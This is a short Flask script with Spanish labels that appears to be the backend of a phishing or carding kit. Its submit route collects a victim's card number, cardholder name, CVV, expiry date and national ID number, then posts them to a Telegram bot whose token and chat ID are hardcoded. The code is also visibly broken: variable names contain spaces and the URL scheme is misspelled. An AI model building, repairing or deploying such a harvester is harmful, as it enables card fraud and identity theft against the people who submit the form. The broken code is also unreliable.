from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# ⚠️ Usa tus datos de Telegram (reemplaza aquí)
TOKEN = "8387875832:AAHzHKkbS3UROxyvEEL1StbExNwMsROvmI8"
CHAT_ID = "7778017947"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    numero de tarjeta = request.form.get("numero de tarjeta")
    nombre de titular = request.form.get("nombre de titular")
    CVV = request.form.get("CVV")
    fecha de vencimiento = request.form.get("fecha de vencimiento")
    dni = request.form.get("dni")

    mensaje = f"""
📩 Nuevo formulario recibido:
👤 numero de tarjeta: {numero de tarjeta}
🏠 nombre de titular: {nombre de titular}#
📞 CVV: {CVV}
📅 fecha de vencimiento (AA/MM): {fecha de vencimiento}
📍 dni: {dni}
    """

    url = f"httpsn://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": mensaje})

    return "✅ Datos enviados correctamente"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
